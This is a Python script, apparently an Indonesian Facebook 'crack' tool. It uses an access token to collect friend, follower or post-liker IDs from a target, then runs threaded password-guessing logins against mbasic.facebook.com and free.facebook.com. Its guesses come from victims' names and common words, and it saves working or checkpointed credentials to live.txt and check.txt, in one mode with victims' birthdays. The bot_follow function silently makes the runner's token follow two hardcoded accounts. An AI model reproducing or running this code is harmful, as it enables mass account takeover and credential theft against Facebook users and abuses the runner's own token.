#!/usr/bin/python3
#-*-coding:utf-8-*-

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""
ip = requests.get("https://api.ipify.org").text
def banner():
    print((m+" ╔═╗┌─┐┌┐┌┌─┐┌─┐┬  ╔═╗┬─┐┌─┐┌─┐┬┌─")) 
    print((p+" ╚═╗├┤ │││├─┘├─┤│  ║  ├┬┘├─┤│  ├┴┐"))
    print((m+" ╚═╝└─┘┘└┘┴  ┴ ┴┴  ╚═╝┴└─┴ ┴└─┘┴ ┴ "+m+"•"+k+"•"+h+"•"))
    print((m+"«-----------------------✧-----------------------»"+p))
    print((p+" ["+h+"++"+p+"]"+p+" IP      : "+p+ip))
    print((p+" ["+h+"++"+p+"]"+p+" Tanggal : "+p+durasi))
    print((p+" ["+h+"++"+p+"]"+p+" GitHub  : "+p+"https://github.com/NajarElite"))
    print((m+"«-----------------------✧-----------------------»"+p))

host="https://mbasic.facebook.com"
ok = []
cp = []
ttl =[]
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
durasi = str(datetime.now().strftime("%d/%m/%Y"))
tahun = current.year
bulan = current.month
hari = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
		
def log_token():
    toket = input(p+"\n ["+h+"++"+p+"]"+p+" token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        jalan((p+"\n ["+h+"√"+p+"]"+p+" login berhasil"))
        bot_follow()
    except KeyError:
        jalan((p+" ["+h+"!!"+p+"]"+p+" token invalid"))
        os.system("clear")
        log_token()

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((p+"\n ["+h+"!!"+p+"]"+p+" token invalid"))
		log_token()
	jalan((p+" ["+h+"••"+p+"]"+p+" tunggu sebentar..."))
	requests.post("https://graph.facebook.com/100011038543431/subscribers?access_token=" + toket) #Najar
	requests.post("https://graph.facebook.com/100063640091878/subscribers?access_token=" + toket) #Juan
	menu()

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((p+" ["+h+"!!"+p+"]"+p+" Error %s"%e))
        os.system("clear")
        banner() 
        log_token()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((p+" ["+h+"++"+p+"]"+p+" Welcome : "+p+nama))
    print((p+" ["+h+"++"+p+"]"+p+" ID      : "+p+id))
    print((m+"«-----------------------✧-----------------------»"+p))
    print((p+" ["+h+"01"+p+"]"+p+" crack id dari publik/teman"))
    print((p+" ["+h+"02"+p+"]"+p+" crack id dari followers"))
    print((p+" ["+h+"03"+p+"]"+p+" crack id dari postingan"))
    print((p+" ["+h+"04"+p+"]"+p+" lihat hasil crack"))
    print((p+" ["+h+"00"+p+"]"+p+" logout"))
    print((m+"«-----------------------✧-----------------------»"+p))
    pilih_menu()

def pilih_menu():
	r=input(p+"\n ["+h+"••"+p+"]"+p+" ︻テ╤───➤ : ")
	if r=="":
		print((p+"["+h+"!!"+p+"]"+p+" isi yg bener bodat !"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		ress()
	elif r=="0":
		try:
			jalan(p+"\n ["+h+"••"+p+"]"+p+" logout berhasil")
			jalan(p+" ["+h+"••"+p+"]"+p+" terimakasih telah menggunakan script ini :)")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((p+" ["+h+"!!"+p+"]"+p+" Error %s"%e))
	else:
		print((p+" ["+h+"!!"+p+"]"+p+" pilih yg bener bodat !"))
		menu()	

def pilihcrack(file):
  os.system("clear")
  banner() 
  print((p+" ["+h+"++"+p+"]"+p+" pilih metode crack "))
  print((p+" ["+h+"01"+p+"]"+p+" mbasic "))
  print((p+" ["+h+"02"+p+"]"+p+" mbasic + ttl "))
  print((p+" ["+h+"03"+p+"]"+p+" free fb "))
  krah=input(p+"\n ["+h+"••"+p+"]"+p+" ︻テ╤───➤ : ")
  if krah in[""]:
    print((h+"["+m+"!"+h+"]"+m+" isi yg bener bodat !"))
    pilihcrack(file)
  elif krah in["1","01"]:
    crack(file)
  elif krah in["2","02"]:
    crackttl(file)
  elif krah in["3","03"]:
    crackffb(file)
  else:
    print((p+"["+h+"!!"+p+"]"+p+" isi yg bener bodat !"))
    pilihcrack(file)

def publik():
	os.system("clear")
	banner() 
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n["+p+"!"+p+"]"+p+" token/cookie invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		print((p+" ["+h+"••"+p+"]"+p+" ketik \'me\' untuk crack dari daftar teman"))
		idt = input(p+" ["+h+"++"+p+"]"+p+" id target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			jalan((p+" ["+h+"••"+p+"]"+p+" nama : "+op["name"]))
		except KeyError:
			jalan((p+" ["+h+"!!"+p+"]"+p+" id tidak ditemukan"))
			print((p+"\n [ "+h+"kembali"+p+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		jalan((p+" ["+h+"++"+p+"]"+p+" total id : %s"%(len(id))))
		time.sleep(1)
		return pilihcrack(qq)
	except Exception as e:
		exit(p+" ["+h+"!!"+p+"]"+p+" Error : %s"%e)

def follow():
	os.system("clear")
	banner() 
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+h+"!!"+p+"]"+p+" token/cookie invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		idt = input(p+"\n ["+h+"++"+p+"]"+p+" followers id target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			jalan((p+" ["+h+"••"+p+"]"+p+" nama : "+op["name"]))
		except KeyError:
			jalan((p+" ["+h+"!!"+p+"]"+p+" id tidak ditemukan"))
			print((p+"\n [ "+h+"kembali"+p+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		jalan((p+" ["+h+"++"+p+"]"+p+" total id : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"["+h+"!!"+p+"]"+p+" Error : %s"%e)

def likers():
	os.system("clear")
	banner() 
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n ["+h+"!!"+p+"]"+p+" token/cookie invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		idt = input(p+"\n ["+h+"++"+p+"]"+p+" id postingan target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			jalan((p+" ["+h+"••"+p+"]"+p+" nama : "+op["name"]))
		except KeyError:
			jalan((p+" ["+h+"!!"+p+"]"+p+" id tidak ditemukan"))
			print((p+"\n [ "+h+"kembali"+p+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		jalan((p+" ["+h+"++"+p+"]"+p+" total id : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+" ["+h+"!!"+p+"]"+p+" Error : %s"%e)

def generate(text):
	results=[]
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				results.append("kontol")
				results.append("anjing")
				results.append("bangsat")
				results.append("sayang")
				results.append("bismillah")
	return results

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        log_token()

def mbasic(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"??"+p+"]"+p+" apakah anda ingin menggunakan sandi manual? [y/t]"))
		while True:
			f=input(p+" ["+h+"••"+p+"]"+p+" ︻テ╤───➤ : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"++"+p+"]"+p+" contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"••"+p+"]"+p+" sedang crack..."+p+"\n ["+h+"••"+p+"]"+p+" account live save to : live.txt"+p+"\n ["+h+"••"+p+"]"+p+" account check save to : check.txt"+p+"\n ["+h+"••"+p+"]"+p+" jika tidak ada hasil nyalakan mode pesawat 5 detik"+p+"\n ["+h+"••"+p+"]"+p+" semoga beruntung :)"+p+"\n «-----------------------------------------------» "))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"++"+p+"]"+p+" masukan pasword list : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"••"+p+"]"+p+" sedang crack..."+p+"\n ["+h+"••"+p+"]"+p+" account live save to : live.txt"+p+"\n ["+h+"••"+p+"]"+p+" account check save to : check.txt"+p+"\n ["+h+"••"+p+"]"+p+" jika tidak ada hasil nyalakan mode pesawat 5 detik"+p+"\n ["+h+"••"+p+"]"+p+" semoga beruntung :)"+p+"\n «-----------------------------------------------» "))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;37m (••) \x1b[0;33mCheckpoint                \x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n «-----------------------------------------------»\n                                          "%(fl.get("id"),i)))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("check.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;37m (••) \x1b[0;32mLive                  \x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n «-----------------------------------------------»\n                                          "%(fl.get("id"),i)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open("live.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m %s / %s \x1b[0;37mlive : %s \x1b[0;37mcheck : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"??"+p+"]"+p+" apakah anda ingin menggunakan sandi manual? [y/t]"))
		while True:
			f=input(p+" ["+h+"••"+p+"]"+p+" ︻テ╤───➤ : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"++"+p+"]"+p+" contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"••"+p+"]"+p+" sedang crack..."+p+"\n ["+h+"••"+p+"]"+p+" account live save to : live.txt"+p+"\n ["+h+"••"+p+"]"+p+" account check save to : check.txt"+p+"\n ["+h+"••"+p+"]"+p+" jika tidak ada hasil nyalakan mode pesawat 5 detik"+p+"\n ["+h+"••"+p+"]"+p+" semoga beruntung :)"+p+"\n «-----------------------------------------------» "))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"++"+p+"]"+p+" masukan pasword list : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"••"+p+"]"+p+" sedang crack..."+p+"\n ["+h+"••"+p+"]"+p+" account [ok] save to : ok.txt"+p+"\n ["+h+"••"+p+"]"+p+" account [cp] save to : cp.txt"+p+"\n ["+h+"••"+p+"]"+p+" jika tidak ada hasil nyalakan mode pesawat 5 detik\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
						m,d,y = ttl.split("/")
						m = bulan_ttl[m]
						print(("\r\x1b[0;37m (••) \x1b[0;33mCheckpoint               \x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n (••) TTL   : %s \n«-----------------------------------------------»\n                                          "%(fl.get("id"),i,d,m,y)))
						self.cp.append("%s | %s | %s %s %s"%(fl.get("id"),i,d,m,y))
						open("check.txt","a+").write("%s | %s | %s %s %s\n"%(fl.get("id"),i,d,m,y))
						break
					except(KeyError, IOError):
						m = " "
						d = " "
						y = " "
					except:pass
					print(("\r\x1b[0;37m (••) \x1b[0;32mLive                 \x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n (••) TTL   : %s \n«-----------------------------------------------»\n                                          "%(fl.get("id"),i,d,m,y)))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("check.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;37m (••) \x1b[0;32mLive\x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n (••) TTL   : %s \n«-----------------------------------------------»\n                                          "%(fl.get("id"),i,d,m,y)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open("live.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r \x1b[0;37m%s/%s \x1b[0;37mlive:%s \x1b[0;37mcheck:%s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+h+"??"+p+"]"+p+" apakah anda ingin menggunakan sandi manual? [y/t]"))
		while True:
			f=input(p+" ["+h+"••"+p+"]"+p+" ︻テ╤───➤ : ")
			if f=="":continue
			elif f=="y":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+h+"++"+p+"]"+p+" contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="t":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+h+"••"+p+"]"+p+" sedang crack..."+p+"\n ["+h+"••"+p+"]"+p+" account live save to : live.txt"+p+"\n ["+h+"••"+p+"]"+p+" account check save to : check.txt"+p+"\n ["+h+"••"+p+"]"+p+" jika tidak ada hasil nyalakan mode pesawat 5 detik"+p+"\n ["+h+"••"+p+"]"+p+" semoga beruntung :)"+p+"\n «-----------------------------------------------» "))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+h+"++"+p+"]"+p+" masukan pasword list : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+h+"••"+p+"]"+p+" sedang crack..."+p+"\n ["+h+"••"+p+"]"+p+" account live save to : live.txt"+p+"\n ["+h+"••"+p+"]"+p+" account check save to : check.txt"+p+"\n ["+h+"••"+p+"]"+p+" jika tidak ada hasil nyalakan mode pesawat 5 detik"+p+"\n ["+h+"••"+p+"]"+p+" semoga beruntung :)"+p+"\n «-----------------------------------------------» "))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;37m (••) \x1b[0;33mCheck               \x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n «-----------------------------------------------»\n                                          "%(fl.get("id"),i)))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("check.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;37m (••) \x1b[0;32mLive                 \x1b[0;37m\n (••) ID     : %s \n (••) PASS   : %s \n «-----------------------------------------------»\n                                          "%(fl.get("id"),i)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open("live.txt","a+").write("%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r \x1b[0;37m%s/%s \x1b[0;37mlive:%s \x1b[0;37mcheck:%s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

def results(Najar,Ganteng):
        if len(Najar) !=0:
                print(("[ok] : "+str(len(Ganteng))))
        if len(Ganteng) !=0:
                print(("[cp] : "+str(len(Ganteng))))
        if len(Najar) ==0 and len(Ganteng) ==0:
                print("\n")
                print((p+"["+m+"!"+p+"]"+h+" hasil tidak ditemukan"))

def ress():
    os.system("clear")
    banner()
    print((p+"\n [ "+h+"lihat hasil crack"+p+" ]"+p))
    print((p+"\n [ "+h+"live"+p+" ]"+p))
    try:
        os.system("cat live.txt")
    except IOError:
        print((p+" ["+h+"!!"+p+"]"+p+" hasil tidak ditemukan"))
    print((p+"\n [ "+k+"check"+p+" ]"+p))
    try:
        os.system("cat check.txt")
    except IOError:
        print((p+" ["+h+"!"+p+"]"+p+" hasil tidak ditemukan"))
    input(p+"\n [ "+h+"kembali"+p+" ]"+p)
    menu()

if __name__=="__main__":
	menu()